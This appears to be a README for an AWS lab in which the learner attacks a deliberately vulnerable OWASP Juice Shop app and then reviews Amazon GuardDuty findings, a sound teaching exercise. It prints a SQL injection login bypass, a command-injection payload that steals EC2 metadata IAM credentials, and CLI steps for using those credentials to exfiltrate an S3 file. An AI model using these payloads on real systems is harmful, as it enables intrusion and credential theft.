# Threat Detection with Amazon GuardDuty (OWASP Juice Shop Lab)

## Overview

This project is an end-to-end security lab where an intentionally vulnerable OWASP Juice Shop web application is deployed on AWS, attacked like a real hacker would, and then monitored with **Amazon GuardDuty** and Malware Protection to detect credential theft, data exfiltration, and malware.

By playing both attacker and defender, this lab shows how insecure web applications can be abused and how GuardDuty surfaces those threats for investigation.

![Image](http://learn.nextwork.org/overjoyed_silver_glamorous_cape_gooseberry/uploads/aws-security-guardduty_v1w2x3y4)

---

## What This Project Covers

- Deploy a vulnerable OWASP Juice Shop web app via CloudFormation.
- Perform **SQL injection** to bypass login and gain admin access.
- Perform **command injection** to steal EC2 instance IAM credentials.
- Use stolen credentials from CloudShell to exfiltrate sensitive data from S3.
- Enable Amazon GuardDuty & Malware Protection and analyze security findings, including EICAR test malware.

---

## Why Perform SQL & Command Injection (Attacker Perspective)

- **Goal of SQL injection:**

  - Simulate how an attacker bypasses authentication to gain unauthorized admin access.
  - This creates abnormal login behavior that GuardDuty can later relate to subsequent suspicious actions.

- **Goal of command injection:**
  - Simulate how an attacker uses a compromised web app to run OS-level commands on the EC2 host and steal IAM credentials from the EC2 metadata service.
  - This sets up the later stage where stolen credentials are abused from another environment (CloudShell), which GuardDuty is designed to detect.

Together, these attacks build a realistic kill chain: app compromise → credential theft → data exfiltration, which GuardDuty and Malware Protection are then evaluated against.

---

## 1. Project Setup

- Define project goal: use GuardDuty to detect real attacks against an insecure web app on AWS.
- Use a step-by-step workflow to act as both the attacker and the defender.

---

## 2. Deploy Insecure Web App (CloudFormation)

- Log in to the AWS Management Console as an **IAM Admin** in a nearby region.
- Open **CloudFormation** → **Create stack** → **With new resources (standard)**.
- Upload the CloudFormation template from this repo: `guardduty-owasp-juiceshop.yaml`
- Set a unique stack name, for example: `My-GuardDuty-project-<your-name>`
- Keep default parameters, skip Tags/Permissions, enable rollback on failure and select Delete all newly created resources.
- Acknowledge IAM resource creation and submit the stack.
- Wait until the stack status becomes `CREATE_COMPLETE`.

**Key resources created:**

- OWASP Juice Shop web app running on an EC2 instance.
- Networking: new VPC, subnets, security group, internet gateway, route tables, load balancer, Auto Scaling group, VPC endpoints, etc.
- S3 bucket storing `secret-information.txt` and other simulated sensitive data.
- GuardDuty enabled to monitor the environment.

![Image](http://learn.nextwork.org/overjoyed_silver_glamorous_cape_gooseberry/uploads/aws-security-guardduty_n1o2p3q4)

---

## 3. Access Web App & SQL Injection (Admin Login)

### Why this attack?

Performing SQL injection shows how a poorly validated login form can be used to skip authentication and gain admin privileges. This is the **initial compromise**, which gives an attacker a foothold inside the app and sets up later stages of the attack.

### Steps

- In CloudFormation, open the **Outputs** tab and copy `JuiceShopURL`.
- Open `JuiceShopURL` in a browser and confirm the Juice Shop landing page.
- Go to **Account → Login**.
- In the **Email** field, enter: `' or 1=1;--`
- In the **Password** field, enter any value.
- Click **Log in**.
- Verify that you are logged in as admin (green banner / admin login challenge solved).

<img src="http://learn.nextwork.org/overjoyed_silver_glamorous_cape_gooseberry/uploads/aws-security-guardduty_h1i2j3k4" alt="SQL injection" width="400">

**Benefit later in the project:**

- Demonstrates a classic OWASP vulnerability and how small input strings can bypass authentication.
- Provides admin access so a second-stage attack (command injection) can be launched from within the admin interface.

---

## 4. Command Injection & Steal IAM Credentials

### Why this attack?

Command injection shows how insecure handling of input in an admin panel can lead to arbitrary command execution on the server. Here, that execution reaches the EC2 instance metadata service to steal IAM role credentials.

This is critical later because those stolen credentials are then used from CloudShell (another AWS account context), which triggers specific high-severity GuardDuty findings for credential exfiltration and unusual usage.

### Steps

- In the Juice Shop app, go to **Account → admin@juice-sh.op** to open the admin profile page.
- In the **Username** field, paste this command injection payload:

  ```
  #{global.process.mainModule.require('child_process').exec('CREDURL=http://169.254.169.254/latest/meta-data/iam/security-credentials/;TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` && CRED=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" -s $CREDURL | echo $CREDURL$(cat) | xargs -n1 curl -H "X-aws-ec2-metadata-token: $TOKEN") && echo $CRED | json_pp >frontend/dist/frontend/assets/public/credentials.json')}
  ```

- Click **Set Username**.
- Confirm that the username shows `[object Object]`, which indicates the JavaScript object was created and the command executed.
- In the browser, open: `https://<JuiceShopURL>/assets/public/credentials.json`
- Verify the JSON response contains `AccessKeyId`, `SecretAccessKey`, `Token`, and `Expiration` (the EC2 instance's IAM credentials).

<img src="http://learn.nextwork.org/overjoyed_silver_glamorous_cape_gooseberry/uploads/aws-security-guardduty_t3u4v5w6" alt="Command injection" width="400">

![Image](http://learn.nextwork.org/overjoyed_silver_glamorous_cape_gooseberry/uploads/aws-security-guardduty_x7y8z9a0)

**Benefit later in the project:**

- Creates a realistic scenario where credentials are exposed through a web app vulnerability.
- Sets up the exact credentials that will later be abused from CloudShell, which GuardDuty is designed to detect as anomalous credential usage.

---

## 5. Use Stolen Credentials in CloudShell & Steal S3 Data

### Why this step?

This step simulates an attacker who has already stolen credentials and is now using them from a different environment to access private data in S3. This is the **data exfiltration** phase of the attack chain, and it gives GuardDuty something concrete to alert on.

### Steps

- Open **AWS CloudShell** from the AWS Management Console.
- Set environment variables based on CloudFormation Outputs:

  ```
  export JUICESHOPURL="<JuiceShopURL>"
  export JUICESHOPS3BUCKET="<TheSecureBucket>"
  ```

- Download the exposed credentials file from the web app into CloudShell:

  ```
  wget $JUICESHOPURL/assets/public/credentials.json
  ```

- Display the credentials in a readable format:

  ```
  cat credentials.json | jq
  ```

- Configure an AWS CLI profile named `stolen` using the credentials (use the region where your stack is deployed):

  ```
  aws configure set profile.stolen.region ap-south-1
  aws configure set profile.stolen.aws_access_key_id $(cat credentials.json | jq -r '.AccessKeyId')
  aws configure set profile.stolen.aws_secret_access_key $(cat credentials.json | jq -r '.SecretAccessKey')
  aws configure set profile.stolen.aws_session_token $(cat credentials.json | jq -r '.Token')
  ```

- Use the `stolen` profile to copy sensitive data from S3:

  ```
  aws s3 cp s3://$JUICESHOPS3BUCKET/secret-information.txt . --profile stolen
  ```

- View the secret file:

  ```
  cat secret-information.txt
  ```

- Confirm the private message indicating that sensitive information has been accessed.

![Image](http://learn.nextwork.org/overjoyed_silver_glamorous_cape_gooseberry/uploads/aws-security-guardduty_j9k0l1m2)

**Benefit later in the project:**

- Produces exactly the kind of suspicious API calls (using EC2 instance credentials from another account/session) that GuardDuty flags as credential exfiltration and unauthorized access.

---

## 6. Detect Attack with Amazon GuardDuty

- Open **Amazon GuardDuty** in the same region.
- Go to **Findings** and wait a few minutes for new findings to appear.
- Look for a **High** severity finding such as: `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.InsideAWS`
- Inspect the finding details:
  - Stolen EC2 instance credentials used from CloudShell (different account ID context).
  - Affected IAM role and S3 bucket.
  - API calls like `GetObject` against your bucket using those credentials.

This validates that GuardDuty can detect the credential-theft and data-exfiltration behavior you simulated.

![Image](http://learn.nextwork.org/overjoyed_silver_glamorous_cape_gooseberry/uploads/aws-security-guardduty_v1w2x3y4)

---

## 7. Enable Malware Protection & Test with EICAR

- In GuardDuty settings, enable **Malware Protection for S3** and select the project's S3 bucket.
- Download the **[EICAR-test-file.txt](https://storage.googleapis.com/nextwork_course_resources/courses/aws/AWS%20Project%20People%20projects/Project%3A%20Threat%20Detection%20with%20Amazon%20GuardDuty/EICAR-test-file.txt)**
- Upload `eicar-test-file.txt` to the protected S3 bucket.
- Return to GuardDuty → **Findings** and verify a new malware-related finding indicating the EICAR test object was detected.

![Image](http://learn.nextwork.org/overjoyed_silver_glamorous_cape_gooseberry/uploads/aws-security-guardduty_sm42x3y4)

---

## 8. Cleanup

- Delete the CloudFormation stack to remove all lab resources.
- Delete any temporary `cf-templates-*` S3 buckets used by CloudFormation.
- In CloudShell, remove sensitive files:

  ```
  rm credentials.json
  rm secret-information.txt
  ```
  OR
  ```
  rm -rf *
  ```

- Remove local copies of the template and EICAR file if downloaded.

---

## Files in This Repository

- `guardduty-owasp-juiceshop.yaml` – CloudFormation template for this lab.
- `EICAR-test-file.txt` – EICAR malware test file for Malware detection.

---

## Skills Demonstrated

- **AWS:** GuardDuty, CloudFormation, EC2, S3, CloudFront, CloudShell, IAM, VPC Networking, Load Balancers.
- **Security:** SQL injection, command injection, EC2 metadata abuse for credential theft, S3 data exfiltration, malware detection.
- **DevOps / IaC:** Automated environment creation/teardown with CloudFormation, CLI-driven workflows, and clean lab hygiene.
